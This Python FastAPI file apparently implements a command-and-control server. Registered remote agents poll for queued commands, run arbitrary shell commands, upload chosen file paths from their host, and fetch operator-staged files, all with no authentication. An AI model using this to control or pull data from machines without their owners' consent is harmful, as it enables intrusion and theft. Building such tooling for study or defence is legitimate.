from typing import Union
from agent import Agent
from fastapi import FastAPI, Request, HTTPException, UploadFile, File
from fastapi.responses import FileResponse
from pydantic import BaseModel
from collections import defaultdict
from models import *
import random
import os
import shutil
from pathlib import Path
import uvicorn


app = FastAPI()
# id : agent
agents = {}

# Configuration constants
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB limit for file uploads/downloads

@app.get("/")
def read_root():
    return {"Hello": "World"}


################### for server
@app.get("/agents")
def get_agents():
    return agents.keys()

@app.get("/agent/{id}")
def get_agent(agent_id: int):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    return agents[agent_id]

################### Command Management (Server side)
@app.post("/create_command/{agent_id}")
def create_exec_command(agent_id: int, command: str):
    """Legacy endpoint - create an exec command"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    command_id = ag.add_command("exec", {"command": command})
    return {'command_id': command_id, 'type': 'exec'}


@app.post("/command/{agent_id}/exec")
def create_exec_command_v2(agent_id: int, command: str):
    """Create an exec command"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    command_id = ag.add_command("exec", {"command": command})
    return {'command_id': command_id, 'type': 'exec', 'status': 'queued'}


@app.post("/command/{agent_id}/upload")
def create_upload_command(agent_id: int, source_path: str, filename: str = None):
    """
    Create an upload command - agent will upload a file from source_path

    Args:
        agent_id: The agent ID
        source_path: Path on agent's machine to upload
        filename: Optional custom filename (defaults to basename of source_path)
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    if not filename:
        filename = os.path.basename(source_path)

    ag: Agent = agents[agent_id]
    command_id = ag.add_command("upload", {
        "source_path": source_path,
        "filename": filename
    })
    return {
        'command_id': command_id,
        'type': 'upload',
        'status': 'queued',
        'message': f'Agent will upload {source_path} as {filename}'
    }


@app.post("/command/{agent_id}/download")
def create_download_command(agent_id: int, filename: str, save_as: str = None):
    """
    Create a download command - agent will download a file from server

    Args:
        agent_id: The agent ID
        filename: File in the agent's directory to download
        save_as: Optional path where agent should save the file
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Check if file exists in agent's directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    file_path = agent_dir / filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {filename} not found for this agent")

    if not save_as:
        save_as = filename

    ag: Agent = agents[agent_id]
    command_id = ag.add_command("download", {
        "filename": filename,
        "save_as": save_as,
        "url": f"/files/agent_{agent_id}/{filename}"
    })
    return {
        'command_id': command_id,
        'type': 'download',
        'status': 'queued',
        'message': f'Agent will download {filename} and save as {save_as}'
    }


@app.get("/command/{agent_id}/{command_id}")
def get_command_result(agent_id: int, command_id: int):
    """Get the result of a specific command"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    result = ag.get_result(command_id)
    if result is None:
        raise HTTPException(status_code=404, detail=f"Command {command_id} not found")
    return result


################### for agent
@app.post("/join")
def create_agent(hostname: str, user: str, request: Request):
    # Generate a random agent ID that doesn't already exist
    attempts = 0
    max_attempts = 100
    agent_id = random.randint(100000, 999999)  # 6-digit IDs

    while agent_id in agents and attempts < max_attempts:
        agent_id = random.randint(100000, 999999)
        attempts += 1

    if agent_id in agents:
        raise HTTPException(status_code=500, detail="Failed to generate unique agent ID")

    ag = Agent(agent_id, request.client.host, hostname, user)
    agents[agent_id] = ag

    return {'id': agent_id, "status": True}

@app.get("/agent/get_commands/{agent_id}")
def get_commands(agent_id: int):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent
    ag = agents[agent_id]
    commands = ag.get_commands()
    return {'commands': commands}



@app.post("/agent/set_commands")
def set_commands(commands: Commands):
    """Legacy endpoint - for backward compatibility"""
    if commands.agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {commands.agent_id} not found")
    ag: Agent = agents[commands.agent_id]
    for command in commands.commands:
        ag.set_result(command.command_id, "success", result=command.result)
    return {'status': True}


@app.post("/agent/set_command_result")
def set_command_result(agent_id: int, command_id: int, status: str, result: str = None, error: str = None):
    """New endpoint - agent reports command result"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    success = ag.set_result(command_id, status, result, error)
    if not success:
        raise HTTPException(status_code=404, detail=f"Command {command_id} not found")
    return {'status': True, 'message': 'Result recorded'}


################### File transfer endpoints
@app.post("/agent/upload_file")
async def agent_upload_file(agent_id: int, file: UploadFile = File(...)):
    """
    Agent uploads a file to the server
    This is called by the agent when executing an 'upload' command
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename to prevent path traversal
    safe_filename = Path(file.filename).name

    # Create agent-specific directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    agent_dir.mkdir(exist_ok=True)

    # Save the uploaded file
    file_path = agent_dir / safe_filename

    # Check file size
    file.file.seek(0, 2)
    file_size = file.file.tell()
    file.file.seek(0)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File too large (max {MAX_FILE_SIZE // (1024*1024)}MB)")

    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    # Track the upload in agent
    ag: Agent = agents[agent_id]
    ag.add_uploaded_file(safe_filename, str(file_path), file_size)

    return {
        'status': 'success',
        'filename': safe_filename,
        'size': file_size
    }


@app.get("/files/{agent_dir}/{filename}")
async def serve_file(agent_dir: str, filename: str):
    """
    Serve a file for agent download
    This is called by the agent when executing a 'download' command
    URL format: /files/agent_{agent_id}/{filename}
    """
    # Sanitize filename to prevent path traversal
    safe_filename = Path(filename).name

    # Construct file path
    file_path = UPLOAD_DIR / agent_dir / safe_filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {safe_filename} not found")

    # Extract agent_id from agent_dir (format: agent_123456)
    if agent_dir.startswith("agent_"):
        try:
            agent_id = int(agent_dir.split("_")[1])
            if agent_id in agents:
                ag: Agent = agents[agent_id]
                ag.add_downloaded_file(safe_filename)
        except (ValueError, IndexError):
            pass  # Invalid format, just serve the file without tracking

    return FileResponse(
        path=str(file_path),
        filename=safe_filename,
        media_type='application/octet-stream'
    )


@app.get("/files/{agent_id}")
def list_agent_files(agent_id: int):
    """List all files available for an agent"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"

    if not agent_dir.exists():
        return {'files': []}

    files = []
    for file_path in agent_dir.iterdir():
        if file_path.is_file():
            files.append({
                'filename': file_path.name,
                'size': os.path.getsize(file_path)
            })

    return {'files': files}


@app.post("/upload_for_agent/{agent_id}")
async def upload_file_for_agent(agent_id: int, file: UploadFile = File(...)):
    """
    Server operator uploads a file that an agent can download later
    Use this to stage files, then create a download command
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename
    safe_filename = Path(file.filename).name

    # Create agent-specific directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    agent_dir.mkdir(exist_ok=True)

    # Check file size
    file.file.seek(0, 2)
    file_size = file.file.tell()
    file.file.seek(0)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File too large (max {MAX_FILE_SIZE // (1024*1024)}MB)")

    # Save the uploaded file
    file_path = agent_dir / safe_filename
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {
        'status': True,
        'filename': safe_filename,
        'size': file_size,
        'message': f'File ready for agent {agent_id} to download',
        'download_url': f'/files/agent_{agent_id}/{safe_filename}'
    }


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)